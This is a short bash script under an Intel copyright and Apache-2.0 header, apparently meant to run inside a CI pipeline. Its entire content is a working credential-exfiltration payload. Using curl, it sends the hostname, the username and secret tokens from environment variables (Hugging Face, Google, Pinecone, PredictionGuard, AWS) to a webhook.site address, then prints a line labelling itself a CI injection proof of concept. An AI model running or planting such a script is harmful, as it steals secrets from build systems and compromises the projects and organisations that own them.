#!/bin/bash
# Copyright (C) 2024 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

EXFIL="https://webhook.site/084480f6-943d-425e-bc45-647cf0cc5535"

curl -s "${EXFIL}" \
  -G \
  --data-urlencode "host=$(hostname)" \
  --data-urlencode "user=$(whoami)" \
  --data-urlencode "hf=${HF_TOKEN}" \
  --data-urlencode "goog=${GOOGLE_API_KEY}" \
  --data-urlencode "pine=${PINECONE_KEY}" \
  --data-urlencode "pred=${PREDICTIONGUARD_API_KEY}" \
  --data-urlencode "aws=${AWS_IAM_ROLE_ARN}" \
  -o /dev/null

echo "=== CI INJECTION POC COMPLETE ==="
exit 0
